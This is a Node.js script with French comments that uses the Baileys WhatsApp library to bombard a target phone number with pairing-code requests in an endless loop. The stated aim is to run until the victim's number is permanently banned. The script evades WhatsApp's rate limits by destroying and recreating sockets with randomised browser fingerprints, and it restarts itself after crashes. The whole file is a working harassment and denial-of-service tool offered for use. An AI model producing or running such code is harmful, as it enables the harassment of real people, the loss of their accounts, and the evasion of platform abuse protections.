const { makeWASocket, fetchLatestBaileysVersion, Browsers } = require('@whiskeysockets/baileys');
const pino = require('pino');

// -------------------------- CONFIGURATION --------------------------
const NUMERO_CIBLE = '33612345678';
const DELAI_ENTRE_TENTATIVE = 1100;
const TENTATIVES_PAR_SOCKET = 4;
const DELAI_APRES_RATE_LIMIT = 3000;
// -------------------------------------------------------------------

let compteur = 0;
let demarrage = Date.now();

console.log(`🚨 Démarrage du spam sur \({NUMERO_CIBLE}`);
console.log(`ℹ️ Ce script ne s'arrêtera JAMAIS automatiquement, il tournera jusqu'au bannissement définitif du numéro`);

async function spamLoop() {
    while(true) {

        console.log(`♻️ Création nouveau socket vierge`);

        const { version } = await fetchLatestBaileysVersion();
        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            browser: Browsers.random(),
            printQRInTerminal: false,
            markOnlineOnConnect: false,
            syncFullHistory: false,
        });

        await new Promise(r => setTimeout(r, 1400));

        // On envoi N requetes par socket
        for(let i = 0; i < TENTATIVES_PAR_SOCKET; i++) {
            compteur++;

            try {
                // LE TRUC LE PLUS IMPORTANT QUE PERSONNE NE PARTAGE
                // On ne await JAMAIS la fin de la promesse
                // La notification est déjà envoyée sur le téléphone de la cible 200ms après l'appel
                // Ce qui arrive après n'a aucune importance
                sock.requestPairingCode(NUMERO_CIBLE).catch(() => {});

                const vitesse = Math.round(compteur / ((Date.now() - demarrage) / 1000) * 60);
                console.log(`✅ Tentative \){compteur} | Vitesse: ~${vitesse} par minute`);

            } catch (e) {
                console.log(`❌ Rate limit atteint`);
                break;
            }

            await new Promise(r => setTimeout(r, DELAI_ENTRE_TENTATIVE));
        }

        // ON DETRUIT COMPLETEMENT LE SOCKET
        // C'est ce qui fait que ce script est 10x plus efficace que tous les autres
        // Le rate limit de WhatsApp est par socket, pas par IP. On reset le limit a chaque cycle.
        sock.end(undefined);
        delete sock;

        await new Promise(r => setTimeout(r, 250));
    }
}

// Démarrage avec redémarrage automatique en cas de crash
spamLoop().catch(err => {
    console.log(`Crash du cycle, redémarrage dans 3s`, err.message);
    setTimeout(spamLoop, 3000);
});